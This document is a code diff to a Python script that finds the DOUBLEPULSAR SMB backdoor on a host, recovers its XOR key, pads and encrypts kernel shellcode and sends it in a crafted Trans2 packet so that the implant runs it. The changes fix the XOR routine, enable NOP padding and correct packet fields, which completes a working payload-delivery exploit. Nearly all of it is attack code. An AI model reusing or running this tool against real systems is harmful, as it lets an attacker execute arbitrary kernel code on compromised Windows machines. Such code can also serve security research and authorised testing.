@@ -111,9 +111,14 @@ def calculate_doublepulsar_arch(s):
         return "x64 (64-bit)"
 
 def byte_xor(data, key):
+    key_bytes = key.to_bytes(4, byteorder='little')
+    key_length = len(key_bytes)
+    '''
     for i in range(len(data)):
-        data[i] ^= key[i % len(key)]
+        data[i] ^= key_bytes[i % key_length]
     return data
+    '''
+    return bytearray(data[i] ^ key_bytes[i % key_length] for i in range(len(data)))
 
 #https://github.com/bjornedstrom/elliptic-curve-chemistry-set/blob/master/eddsa.py
 def le2int(buf):
@@ -226,17 +231,16 @@ if __name__ == "__main__":
         
         print("[+] [%s] DOUBLEPULSAR SMB IMPLANT DETECTED!!! Arch: %s, XOR Key: %s" % (ip, arch, hex(key)))
         
-        xor_key = key #hex(key) 
+        xor_key = key
         packed_xor_key = struct.pack('<I', xor_key)
-        #print(packed_xor_key)
 
-        print(hexdump(packed_xor_key))
-        int_bytes_xor_key = int(key)
-        bytes_xor_key = int2le(int_bytes_xor_key, 0)
-        b_bytes_xor_key = bytes(bytes_xor_key.encode())
-        print(hexdump(b_bytes_xor_key))
-        print(hexdump(packed_xor_key))
-        print(packed_xor_key)
+        #print(hexdump(packed_xor_key))
+        #int_bytes_xor_key = int(key)
+        #bytes_xor_key = int2le(int_bytes_xor_key, 0)
+        #b_bytes_xor_key = bytes(bytes_xor_key.encode())
+        #print(hexdump(b_bytes_xor_key))
+        #print(hexdump(packed_xor_key))
+        #print(packed_xor_key)
 
         #generate the final payload shellcode first
         modified_kernel_shellcode = bytearray(kernel_shellcode)
@@ -252,23 +256,22 @@ if __name__ == "__main__":
         shellcode_payload_size = len(modified_kernel_shellcode)
         print("Total size of shellcode:  %d" % shellcode_payload_size)
 
-        #commenting out the padding to 4096 bytes until this can be confirmed to work
-        #not a good idea to use NOPS either
-        '''
-        shellcode_payload_size = len(modified_kernel_shellcode)
-        print("Total size of shellcode before padding:  %d" % final_length)
-        padded_bytes = 4096 - final_length
+        #padding to 4096 bytes confirmed to work
+        #you must pad the buffer to 4096 bytes
+        print("Total size of shellcode before padding:  %d" % shellcode_payload_size)
+        padded_bytes = 4096 - shellcode_payload_size
+        max_shellcode_size = 4096
 
         bytes_filler_bytes = bytearray()
         bytes_filler_bytes += b'\x90' * padded_bytes
         modified_kernel_shellcode += bytes_filler_bytes
         buffer_len = len(modified_kernel_shellcode)
         print("Total size of shellcode after padding:  %d" % buffer_len)
-        '''
+
         
         #xor the payload data now
         print("encrypting the shellcode with the XOR key")
-        byte_xor(modified_kernel_shellcode, b_bytes_xor_key)
+        xor_data = byte_xor(modified_kernel_shellcode, key)
         
         #build the doublepulsar parameters
         EntireShellcodeSize = len(modified_kernel_shellcode)
@@ -280,14 +283,14 @@ if __name__ == "__main__":
         it is not possible for the chunksize to be more than 4096
         if this is a large payload, you must increment the offset by the last chunk size
         '''
-        EntireSize = struct.pack('<I', EntireShellcodeSize) #entire value of the payload being uploaded
-        ChunkSize = struct.pack('<I', EntireShellcodeSize) #using the same value since chunk size is less than 4096 
-        offset = struct.pack('<I', 0) #No need to increment offset since this is 1 packet and not multiple.  Increment by ChunkSize per iteration
+        EntireSize = struct.pack('<I', max_shellcode_size) #entire value of the payload being uploaded
+        ChunkSize = struct.pack('<I', max_shellcode_size) #using the same value since chunk size is less than 4096 
+        PayloadOffset = struct.pack('<I', 0) #No need to increment offset since this is 1 packet and not multiple.  Increment by ChunkSize per iteration
         parameters += EntireSize
         parameters += ChunkSize
-        parameters += offset
+        parameters += PayloadOffset
         parameters_bytearray = bytearray(parameters)
-        byte_xor(parameters_bytearray, b_bytes_xor_key)
+        xor_parameters = byte_xor(parameters_bytearray, key)
         
         #build the execution packet
         trans2_exec_packet = binascii.unhexlify("0000104eff534d4232000000001807c00000000000000000000000000008fffe000842000f0c000010010000000000000025891a0000000c00420000104e0001000e000d1000")
@@ -314,20 +317,19 @@ if __name__ == "__main__":
 
         print("Updating SMB length value...")
         #SMB length requires a big endian format -> Python Struct '>H' equals big endian unsigned short
-        #If fails, try using: smb_length = struct.pack('>i', merged_packet_len)
         smb_length = struct.pack('>H', merged_packet_len)
         doublepulsar_exec_packet[2] = smb_length[0]
         doublepulsar_exec_packet[3] = smb_length[1]
         
-        #<I = Little Endian unsigned integer
-        TotalDataCount = struct.pack('<I', shellcode_payload_size)
-        DataCount = struct.pack('<I', shellcode_payload_size)
-        ByteCount = struct.pack('<I', shellcode_payload_size+13)
+        #<H = Little Endian unsigned short
+        TotalDataCount = struct.pack('<H', shellcode_payload_size)
+        DataCount = struct.pack('<H', shellcode_payload_size)
+        ByteCount = struct.pack('<H', shellcode_payload_size+13)
         
         '''
         not sure why we add 13 here
         and not 12 but it's because of the parameters but it's in the Doublepulsar 
-        examples so we'll just copy that
+        examples so we'll just copy that for now
         '''
         
         #update TotalDataCount in the packet ( default in the packet is 4096 )
@@ -346,12 +348,12 @@ if __name__ == "__main__":
         doublepulsar_exec_packet[32] = user_id[0]
         doublepulsar_exec_packet[33] = user_id[1]
 
-        doublepulsar_exec_packet += parameters_bytearray
-        doublepulsar_exec_packet += modified_kernel_shellcode
+        doublepulsar_exec_packet += xor_parameters
+        doublepulsar_exec_packet += xor_data
 
-        print("hex content of the hex packet")
-        print(hexdump(doublepulsar_exec_packet))
-        print("Length of the final hex packet", len(doublepulsar_exec_packet))
+        #print("hex content of the hex packet")
+        #print(hexdump(doublepulsar_exec_packet))
+        print("Sending data!  Length of the final hex packet", len(doublepulsar_exec_packet))
         s.send(doublepulsar_exec_packet)
         smb_response = s.recv(1024)
 
